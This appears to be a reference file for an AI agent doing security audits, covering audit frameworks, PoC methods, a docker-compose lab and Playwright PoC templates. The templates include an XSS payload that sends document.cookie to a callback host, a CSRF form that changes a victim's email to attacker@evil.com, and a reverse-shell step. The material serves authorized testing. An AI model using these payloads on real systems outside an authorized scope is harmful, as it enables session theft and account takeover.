# Audit, PoC Development & Report Reference

> **On-demand only** — this file loads when the user requests formal audit, PoC development, or vulnerability report generation.

---

## Formal Audit Framework

### Multi-Framework Approach

Use OWASP as primary, supplement with STRIDE and PASTA for threat modeling:

| Framework | Focus | When to Use |
|-----------|-------|-------------|
| **OWASP Top 10** | Web application vulnerabilities | Default for web app audits |
| **OWASP ASVS** | Verification standard with levels (L1/L2/L3) | Compliance-driven audits |
| **STRIDE** | Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation | Threat modeling phase |
| **PASTA** | Process for Attack Simulation and Threat Analysis | Risk-centric audits |
| **CWE** | Common Weakness Enumeration | Mapping findings to standard identifiers |

### Audit Phases

1. **Scope definition** — assets, boundaries, rules of engagement, out-of-scope items
2. **Threat modeling** — STRIDE per component, identify trust boundaries, data flow diagrams
3. **Automated scanning** — SAST + DAST + dependency scanning (see `chaining-advanced-techniques.md`)
4. **Manual testing** — follow SKILL.md phases 1-6 for each in-scope component
5. **Chain analysis** — attempt to combine findings for higher impact
6. **Reporting** — structured findings with CVSS scores, evidence, remediation

### Red Team Personas

Approach the target from multiple attacker perspectives:

| Persona | Motivation | Techniques |
|---------|-----------|------------|
| **Script Kiddie** | Opportunistic, uses public tools | Nuclei, SQLMap, default creds, known CVEs |
| **Bug Bounty Hunter** | Financial reward, creative chains | Logic flaws, race conditions, chain building |
| **Insider Threat** | Privileged access, data exfil | Mass assignment, IDOR, credential abuse |
| **APT Actor** | Persistent access, stealth | Supply chain, zero-day, living off the land |
| **Competitor** | Business intelligence | API scraping, data enumeration, IP theft |
| **Hacktivist** | Defacement, data leak | SQLi for data dump, stored XSS, account takeover |

For each persona: what would they target first? What access do they start with? What tools would they use?

---

## Live Exploitation Priority

Attack in priority order. Don't waste time on Medium findings if Critical ones exist.

**P0 - Critical:** RCE (webshell upload, deserialization, template injection, command injection, eval injection, JNDI injection)

**P1 - High:** SQLi, SSRF, auth bypass, path traversal / arbitrary file read, IDOR with sensitive data exposure, XXE with file read/SSRF

**P2 - Medium:** Stored XSS, CSRF on critical actions, race conditions on financial operations, mass assignment to privilege escalation, prototype pollution, HTTP request smuggling

**P3 - Low:** Reflected XSS, information disclosure, missing security headers, CORS misconfiguration, open redirect (unless chainable), subdomain takeover

For each finding: identify the source (user input), trace through transforms, confirm it reaches the sink, craft a working payload, prove impact.

---

## Proof-of-Concept Development

### PoC Methodology

1. **Identify the vulnerability** — exact sink, controllable input, bypass path
2. **Minimal reproduction** — simplest possible payload that demonstrates the issue
3. **Impact demonstration** — escalate to show real-world consequences:
   - RCE → execute `id`/`whoami`, read `/etc/passwd`, establish reverse shell
   - SQLi → extract sensitive data (passwords, API keys, PII)
   - SSRF → access cloud metadata, internal services
   - XSS → steal session cookie, perform action as victim
   - Auth bypass → access protected resources as another user
4. **Chain building** — combine with other findings for maximum impact
5. **Clean up** — remove uploaded shells, test data, and artifacts

### PoC Requirements

Every PoC must include:
- **One-liner summary** of what the vulnerability is
- **Exact curl/HTTP request** or script that triggers it (copy-pasteable)
- **Expected vs actual response** showing the vulnerability
- **Impact statement** — what an attacker gains
- **Prerequisites** — auth level, network position, timing requirements

### PoC Script Template

```
# Vulnerability: [Type] in [Component]
# Severity: [P0/P1/P2/P3]
# CWE: [CWE-ID]
# CVSS: [Score] ([Vector])

# Prerequisites:
# - [Auth level required]
# - [Network position]

# Reproduction:
curl -X POST 'https://target.com/vulnerable-endpoint' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=ATTACKER_SESSION' \
  -d '{"param": "PAYLOAD_HERE"}'

# Expected: [safe behavior]
# Actual: [vulnerable behavior]
# Impact: [what attacker gains]
```

### Reproduction Environment Setup

#### Docker-Compose Lab Architecture

The best methodology for PoC reproduction is a docker-compose stack that mirrors real exploit conditions:

**Step 1 — Check for existing containerization:**
Before creating a new setup, check if the target app already has:
- `Dockerfile` or `docker-compose.yml` in the repository root
- Container definitions in CI/CD configs (`.github/workflows/`, `Jenkinsfile`, etc.)
- README instructions for Docker-based development

If present, extend the existing compose file rather than creating from scratch.

**Step 2 — Build the compose stack:**

```yaml
# docker-compose.poc.yml
version: "3.9"

services:
  # A. Target Application
  target:
    build:
      context: .
      dockerfile: Dockerfile        # Use existing Dockerfile if available
    ports:
      - "8080:8080"                  # Expose for Playwright interaction
    networks:
      - internal
      - external
    environment:
      - DEBUG=true                   # Enable verbose logging for evidence

  # B. Attacker Callback / OOB Listener (for SSRF, OOB-XXE, DNS rebinding, blind injection)
  callback:
    image: python:3-slim
    command: >
      python -c "
      from http.server import HTTPServer, SimpleHTTPRequestHandler
      import logging
      logging.basicConfig(level=logging.INFO)
      class H(SimpleHTTPRequestHandler):
          def do_GET(self):
              logging.info(f'CALLBACK: {self.path} from {self.client_address}')
              self.send_response(200)
              self.end_headers()
              self.wfile.write(b'callback-received')
          do_POST = do_GET
      HTTPServer(('0.0.0.0', 9999), H).serve_forever()
      "
    ports:
      - "9999:9999"                  # Expose for external monitoring
    networks:
      - internal                     # Shares network with target — critical for SSRF/OOB
      - external

  # C. DNS rebinding server (optional — only for DNS rebinding / SSRF bypass tests)
  # dns-rebind:
  #   image: nccgroup/singularity
  #   networks:
  #     - internal

  # D. Internal service (optional — simulates internal infra for SSRF pivoting)
  # internal-service:
  #   image: redis:7-alpine
  #   networks:
  #     - internal                   # NOT exposed externally

networks:
  internal:
    driver: bridge
    internal: true                   # No internet — simulates private network
  external:
    driver: bridge
```

**When to include the callback container:**
- SSRF testing (target reaches `http://callback:9999/ssrf-proof`)
- Out-of-band XXE/SSRF exfiltration
- Blind injection confirmation (SQLi, SSTI, command injection)
- DNS rebinding PoCs
- Any vulnerability requiring out-of-band confirmation

**When NOT needed (target container alone suffices):**
- Reflected/stored XSS (client-side — use Playwright directly)
- IDOR/broken access control
- Logic bugs
- Authentication bypass
- Direct response-based injection (in-band SQLi, direct RCE output)

#### Playwright Full-Interaction PoC

**Almost mandatory for client-side vulnerabilities.** Playwright provides:
- Full browser interaction with video recording — indisputable proof
- JavaScript execution context — necessary for DOM XSS, CSRF, clickjacking PoCs
- Network interception — capture exact requests/responses
- Multi-page flows — login → navigate → trigger → exfiltrate chains

**Playwright PoC template:**

```typescript
// poc.spec.ts — Playwright PoC with video recording
import { test, expect } from '@playwright/test';

test.describe('Vulnerability PoC', () => {
  test.use({
    video: 'on',                    // ALWAYS record video for evidence
    screenshot: 'on',               // Capture screenshots at key moments
    trace: 'on',                    // Full trace for timeline analysis
  });

  test('XSS-001: Stored XSS in comment field', async ({ page }) => {
    // Step 1: Authenticate (if needed)
    await page.goto('http://localhost:8080/login');
    await page.fill('#username', 'attacker');
    await page.fill('#password', 'password');
    await page.click('#login-btn');

    // Step 2: Inject payload
    const payload = '<img src=x onerror="fetch(\'http://callback:9999/xss-proof?cookie=\'+document.cookie)">';
    await page.goto('http://localhost:8080/comments');
    await page.fill('#comment-input', payload);
    await page.click('#submit');

    // Step 3: Trigger as victim (new context = different user)
    const victimContext = await page.context().browser()!.newContext();
    const victimPage = await victimContext.newPage();
    await victimPage.goto('http://localhost:8080/login');
    await victimPage.fill('#username', 'victim');
    await victimPage.fill('#password', 'password');
    await victimPage.click('#login-btn');

    // Step 4: Victim views the page with stored XSS
    await victimPage.goto('http://localhost:8080/comments');

    // Step 5: Verify callback received (check callback container logs)
    // docker logs poc-callback-1 | grep "xss-proof"

    await victimContext.close();
  });

  test('SSRF-001: Server-side request to internal network', async ({ page }) => {
    await page.goto('http://localhost:8080/fetch-url');

    // Inject internal URL pointing to callback container
    await page.fill('#url-input', 'http://callback:9999/ssrf-proof');
    await page.click('#fetch-btn');

    // The callback container logs will show the request came from the target container
    // Proving the server followed the URL to the internal network
  });

  test('CSRF-001: State-changing action without token', async ({ page, context }) => {
    // Step 1: Victim is logged in
    await page.goto('http://localhost:8080/login');
    await page.fill('#username', 'victim');
    await page.fill('#password', 'password');
    await page.click('#login-btn');

    // Step 2: Attacker page triggers cross-origin request
    await page.setContent(`
      <html><body>
        <h1>Attacker Page</h1>
        <form id="csrf" action="http://localhost:8080/api/change-email" method="POST">
          <input name="email" value="attacker@evil.com">
        </form>
        <script>document.getElementById('csrf').submit();</script>
      </body></html>
    `);

    // Step 3: Verify email was changed
    await page.goto('http://localhost:8080/profile');
    await expect(page.locator('#email')).toContainText('attacker@evil.com');
  });
});
```

**Playwright config for PoC recording:**

```typescript
// playwright.config.ts
import { defineConfig } from '@playwright/test';

export default defineConfig({
  use: {
    baseURL: 'http://localhost:8080',
    video: 'on',                     // Always record
    screenshot: 'only-on-failure',
    trace: 'on',
  },
  outputDir: './poc-evidence/',       // All artifacts in evidence directory
  reporter: [['html', { outputFolder: './poc-report/' }]],
});
```

**When to use Playwright (almost mandatory):**
- DOM XSS — need browser JS execution context to prove DOM manipulation
- Stored XSS — need multi-user flow (attacker stores, victim triggers)
- CSRF — need cross-origin request with victim's session
- Clickjacking — need iframe interaction
- Open redirect chains — need to follow redirects in browser context
- OAuth flow attacks — multi-step browser interactions
- Client-side prototype pollution — need browser object manipulation
- Any multi-step exploit chain involving user interaction

**When curl/scripts suffice (Playwright optional but nice):**
- Server-side injection (SQLi, RCE, SSTI) — curl proves it
- SSRF — curl or python script with exact request
- XXE — curl with XML payload
- Deserialization — python/java script generating serialized payload
- API-level auth bypass — curl with modified headers/tokens

#### Evidence Collection Protocol

After reproduction, collect:
1. **Video recording** — from Playwright (`poc-evidence/*.webm`)
2. **Network trace** — Playwright trace file or HAR export
3. **Callback container logs** — `docker compose logs callback` for OOB proof
4. **Target container logs** — `docker compose logs target` for server-side evidence
5. **Screenshots** — key moments (injection, trigger, impact)
6. **Exact commands** — reproducible curl/script for server-side vulns

#### Running the PoC

```bash
# 1. Start the lab environment
docker compose -f docker-compose.poc.yml up -d

# 2. Wait for target to be ready
until curl -s http://localhost:8080/health > /dev/null 2>&1; do sleep 1; done

# 3. Run Playwright PoC (client-side vulns)
npx playwright test poc.spec.ts

# 4. Or run curl-based PoC (server-side vulns)
./poc-ssrf.sh

# 5. Collect evidence
docker compose -f docker-compose.poc.yml logs > poc-evidence/container-logs.txt

# 6. Teardown
docker compose -f docker-compose.poc.yml down -v
```

---

## Proof Collection

Every reported vulnerability MUST include:

1. **Confidence Score (1-10)** — how confident you are this is a real, exploitable issue
2. **Exploitability Likelihood (High/Medium/Low)** + 1-2 sentence justification — how likely is real-world exploitation?
   - **High**: no auth needed, publicly reachable, low complexity, known exploit patterns
   - **Medium**: requires auth or specific conditions, moderate complexity
   - **Low**: requires privileged access, rare conditions, or complex multi-step chain
   - Example: `High — unauthenticated endpoint with no rate limiting, public PoC exists for this CVE`
3. **Auth Level** — required access to trigger the vulnerability:
   - **Unauthenticated** — no credentials needed
   - **Authenticated** — specify the minimum role required (viewer, editor, user, admin, superadmin)
   - **Multi-level** — affects multiple auth levels differently (specify each)
4. **Intent Verification Gate** — double-check that the finding is NOT an intended feature:

   | Question | If YES → likely intended feature |
   |----------|--------------------------------|
   | Does the application documentation describe this as expected functionality? | Admin plugin upload in WordPress, superuser SSH access, debug endpoints behind auth |
   | Is the "attacker" already at the privilege level where this action is expected? | Admin executing code via plugin, root user accessing system files |
   | Would "fixing" this break legitimate workflows? | Removing admin code execution breaks plugin system |
   | Is this a well-known trade-off the platform explicitly accepts? | CMS admin RCE via theme editor, CI/CD pipeline command execution |

   **If all answers are NO → actual bug. If any answer is YES → investigate further:**
   - Is the feature accessible at a LOWER privilege level than intended? (admin feature reachable by editor = real bug)
   - Can it be triggered WITHOUT the expected authentication? (intended admin feature reachable unauthenticated = real bug)
   - Does it expose MORE than the intended scope? (admin file read intended for config but reaches `/etc/shadow` = real bug)

   **Common false positive examples:**
   - WordPress admin uploading a malicious plugin → intended feature (admin has full control by design)
   - Jenkins admin configuring a build step with `sh` → intended feature
   - Grafana admin adding a data source with SSRF potential → intended feature (admin configures integrations)
   - SSH access as root user → intended feature (root has full system access)
   - **BUT**: WordPress *editor* uploading a plugin → real bug (privilege escalation)
   - **BUT**: Jenkins *anonymous* triggering builds → real bug (missing auth)

5. **Intent Classification** — based on the gate above, classify as:
   - **Actual bug**: unintended behavior that violates security assumptions
   - **Intended feature**: functionality working as designed — do NOT report as vulnerability
   - **Design weakness**: intended but represents poor security design — report as Observation with recommendation
6. **Justification** — brief reasoning for the classification

Low-confidence findings (score <= 3) go under a separate **Observations** section, not mixed in with confirmed vulnerabilities. Intended features flagged as design weaknesses also go under Observations.

Additionally, every exploited vulnerability needs:
- Video recording showing the full exploit chain end-to-end
- The exact payload used (copy-pasteable, not screenshots of payloads)
- The server response proving impact
- For multi-role vulns: demonstrate from admin, user, and unauthenticated perspectives
- For race conditions: show concurrent request tool (Turbo Intruder, threading script)
- Clean up: remove uploaded shells and test data after recording

Organize evidence by severity. Master report links to individual agent reports, video files, and raw scanner output.

---

## Vulnerability Report Template

### Executive Summary
- Total findings by severity (Critical/High/Medium/Low/Informational)
- Composite risk score (see `chaining-advanced-techniques.md` for scoring)
- Top 3 highest-impact findings
- Overall security posture assessment

### Scope & Methodology
- Target application(s) and version(s)
- Testing period
- Frameworks used (OWASP, STRIDE, etc.)
- Tools used (manual + automated)
- Limitations and out-of-scope items

### Findings

For each finding:

```
### [SEVERITY] [ID]: [Title]

**CWE:** CWE-XXX
**CVSS:** X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**Confidence:** X/10
**Exploitability Likelihood:** High / Medium / Low — [1-2 sentence justification: why this likelihood rating, considering attack complexity, required conditions, and public exploit availability]
**Auth Level:** Unauthenticated / Authenticated (specify role: viewer, editor, admin, superadmin) / Multi-level (specify which levels affected)
**Intent:** Actual bug / Intended feature / Design weakness (see Intent Verification Gate in Proof Collection above)

**Description:**
[What the vulnerability is, where it exists]

**Reproduction Steps:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Payload:**
```
[Exact copy-pasteable payload]
```

**Evidence:**
[Screenshot/response/video reference]

**Impact:**
[What an attacker can achieve]

**Remediation:**
[Specific fix recommendation with code example]

**References:**
- [CVE/CWE/OWASP reference]
```

### Observations
- Low-confidence findings (score <= 3) with reasoning
- Design weaknesses (intended features with poor security design — include recommendation)
- Potential issues requiring further investigation
- Informational notes about security posture

### Remediation Priority
1. **Immediate** (P0 Critical) — fix before next deployment
2. **Short-term** (P1 High) — fix within current sprint
3. **Medium-term** (P2 Medium) — fix within next release cycle
4. **Long-term** (P3 Low) — address in security backlog

### Appendix
- Full tool output (scanner results, taint analysis reports)
- Network diagrams and data flow maps
- Raw HTTP request/response pairs for each finding
